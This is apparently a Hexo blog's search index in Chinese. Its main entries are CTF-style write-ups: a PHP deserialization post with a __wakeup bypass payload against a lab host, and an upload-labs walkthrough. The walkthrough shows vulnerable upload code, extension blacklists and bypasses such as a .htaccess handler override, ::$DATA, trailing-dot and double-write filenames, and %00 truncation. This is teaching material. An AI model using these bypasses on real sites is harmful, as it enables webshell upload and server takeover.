$copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function() &#123; //-------鼠标离开代码块 //设置复制按钮可见度 2秒内到 0 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); &#125;);//页面载入完成后，创建复制按钮$(document).ready(function() &#123; createCopyBtns();&#125;); 打开 themes/next/layout/_custom/ ,新建文件 custom.swig ，代码如下: 12&lt;script type="text/javascript" src="/lib/clipboard/clipboard.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/js/src/custom.js"&gt;&lt;/script&gt; 修改文件 themes/next/layout/_layout.swig ,在标签 上面插入代码: 1&#123;% include '_custom/custom.swig' %&#125; 参考：https://zhuanlan.zhihu.com/p/30836436https://www.jianshu.com/p/efbeddc5eb19https://blog.csdn.net/zgcr654321/article/details/86751765]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞（1）]]></title>
    <url>%2F2019%2F10%2F06%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[背景Serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。 常见方法__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 比较重要的方法__sleep()serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。 __wakeup()unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 wakeup()函数用法:wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用wakeup()方法。 123456789&lt;?phpclass A&#123;function __wakeup()&#123;echo 'Hello';&#125;&#125;$c = new A();$d=unserialize('O:1:"A":0:&#123;&#125;');?&gt; 最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello。 __wakeup()函数漏洞说明: 1234567891011121314&lt;?phpclass Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;&#125;$s = new Student();var_dump(serialize($s));?&gt; 最后页面上输出的就是Student对象的一个序列化输出:O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。 wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。当我们将上述的序列化的字符串中的对象属性个数修改为5，变为 1234567O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125; 最后执行运行的代码如下: 123456789101112131415class Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize('O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'); 这样就成功地绕过了__wakeup()函数。 例子： 12345678910&lt;?phpclass xctf&#123; //定义一个名为xctf的类public $flag = '111'; //定义一个公有的类属性$flag，值为111public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本exit('bad requests');&#125;&#125;$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为testecho(serialize($test)); //输出被序列化的对象（test）?&gt; 执行结果 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;},要反序列化xctf类的同时还要绕过wakeup方法的执行,如果不绕过就会输出bad requests并退出。修改：http://111.198.29.45:50545/?code=O:4:%22xctf%22:5:{s:4:%22flag%22;s:3:%22111%22;}]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F10%2F04%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[pass-01能有上传点，就先上传一句话试一试，这道题给出的是前端检测，只允许.jpg|.png|.gif上传 解决方法很多，第一种是找到约束上传条件的checkFile(),将其删掉，就直接可以上传.php文件或者是将checkFile()里添加.php也能上传一句话但更通用的办法是：将.php文件隐藏成.jpg，然后再从抓包里面改回.php，这在下面的题中也 有用到。 pass-02第二题同样先上传一句话 这道题同样是文件类型不对，与第一题同属于文件后缀检验，但不是前端检测，然后我再源码中发现了么样一段东西。 12345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 发现是上传的时候只允许image/jpeg。 可以直接在抓包中改Content-Type为image/gif，又因为我们前面有传上的一句话，所以能上传成功。 pass-03这个题也很直接，直接将.php加入黑名单。 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 两种解决方法： 先上传一个.htaccess文件，里面写入 123&lt;FilesMatch "1.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，和我们再上传一个图片木马就能接上传成功 直接上传.php3|.php5（只要后缀能被服务器解析就行） pass-04 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 可以看到这道题限制的后缀很多，但不管限制什么，只要能将.htaccess上传上，后面上传的全都按照.php解析，或者直接上传.PHP(这个没被限制) pass-05 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第五题看起来和第四题也差不多，看源码也差不多，区别是它限制了.htaccess，但是他没转小写，只要将原先的一句话改为.PHP可以 pass-06 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这道题的黑名单也比较全，但是没有首尾去空，可以.(空格)php但是.php(空格)不行，因为windos自动去尾。 pass-07 1234567891011121314151617181920212223242526272829303132&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单也比较全，但没有删除文件名末尾的点思路是上传一个.php.的文件，但是windos不能文件最后加点，所以在抓包里面将.php改为.php. 这样就能上传成功。 pass-08 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单也比较全，但是没有去除后面的::$DATA,也就是在burp中，改为1.php::$DATA,就能上传成功。 pass-09 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单比较全，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字可以在burp里面改为1.php. .就能上传成功 pass-1012345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 拦截方式：$file_name = str_ireplace($deny_ext,””, $file_name);, 作用是把黑名单里面的后缀名替换成空, 由于只替换了一遍, 只对文件名进行了一次过滤，所以可以采用双写绕过。绕过方式：构造双重文件名,1.phphpp pass-11123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; $img_path直接拼接，因此可以利用%00截断绕过。先传一张图片，在抓包中改save_path值为../upload labs/1.php%00//某些情况下可以使用 %00 截断1、PHP 版本 &lt; 5.3.42、php.ini 中 magic_quotes_gpc=off pass-12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 和上题类似，区别是这题是post，上题是get，%00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.在hex里面把2b改成00。 转载自： https://note.youdao.com/ynoteshare1/index.html?id=a2817a779ccb11d86544177a5b212cd2&amp;type=note 原作者：执子之手610]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一篇博文]]></title>
    <url>%2F2019%2F10%2F01%2F%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87%2F</url>
    <content type="text"><![CDATA[今天是十月一日国庆节，祝祖国繁荣昌盛，更加富强！这是我的第一篇博文，从此这里将成为我记录知识，不断成长的一片小园地。documentation ，troubleshooting，GitHubhexo搭建博客的简单用法： 新建博文1$ hexo new "My New Post" More info: Writing 本地预览123$ hexo clean$ hexo g$ hexo s 部署博客123$ hexo clean$ hexo g$ hexo d]]></content>
      <categories>
        <category>记录</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
</search>
